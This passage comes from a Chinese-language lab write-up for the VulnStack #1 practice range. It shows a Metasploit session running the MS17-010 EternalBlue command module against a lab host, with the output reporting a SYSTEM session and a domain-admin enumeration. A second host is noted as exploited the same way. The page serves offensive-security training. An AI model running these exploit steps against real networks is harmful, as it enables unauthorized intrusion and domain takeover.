<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/admin/smb/ms17_010_command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(admin/smb/ms17_010_command) &gt; set rhost 192.168.200.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rhost =&gt; 192.168.200.141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Target OS: Windows Server 2003 3790</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Filling barrel with fish... done</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    -     [*] Preparing dynamite...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    -             Trying stick 1 (x64)...Miss</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    -             [*] Trying stick 2 (x86)...Boom!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    -     [+] Successfully Leaked Transaction!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    -     [+] Successfully caught Fish-in-a-barrel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Reading from CONNECTION struct at: 0x8d1eed60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Built a write-what-where primitive...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445    - Overwrite complete... SYSTEM session obtained!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445    - Service start timed out, OK if running a command or non-service executable...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Getting the command output...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Executing cleanup...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445    - Cleanup was successful</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] 192.168.52.141:445    - Command completed successfully!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Output for &quot;net group&quot;Domain Admins&quot;/domain&quot;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The request will be processed at a domain controller for domain god.org.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Group name     Domain Admins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Comment        ???????</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Members</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator            OWA$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The command completed successfully.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Auxiliary module execution completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="192168200138---eternalblue">192.168.200.138 - EternalBlue<a href="#192168200138---eternalblue" class="hash-link" aria-label="192.168.200.138 - EternalBlue的直接链接" title="192.168.200.138 - EternalBlue的直接链接">​</a></h2>
<p>同上</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/VulnStack/vulnstack-1/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/category/Redclub"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Redclub - 红日靶场</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-2/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">红日靶场 #2</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#靶场部署" class="table-of-contents__link toc-highlight">靶场部署</a></li><li><a href="#信息搜集" class="table-of-contents__link toc-highlight">信息搜集</a></li><li><a href="#webshell-部署" class="table-of-contents__link toc-highlight">webshell 部署</a></li><li><a href="#投放-c2" class="table-of-contents__link toc-highlight">投放 c2</a></li><li><a href="#网络信息搜集" class="table-of-contents__link toc-highlight">网络信息搜集</a></li><li><a href="#域信息搜集" class="table-of-contents__link toc-highlight">域信息搜集</a></li><li><a href="#搭建内网转发" class="table-of-contents__link toc-highlight">搭建内网转发</a></li><li><a href="#内网信息搜集" class="table-of-contents__link toc-highlight">内网信息搜集</a></li><li><a href="#192168200141---eternalblue" class="table-of-contents__link toc-highlight">192.168.200.141 - EternalBlue</a></li><li><a href="#192168200138---eternalblue" class="table-of-contents__link toc-highlight">192.168.200.138 - EternalBlue</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>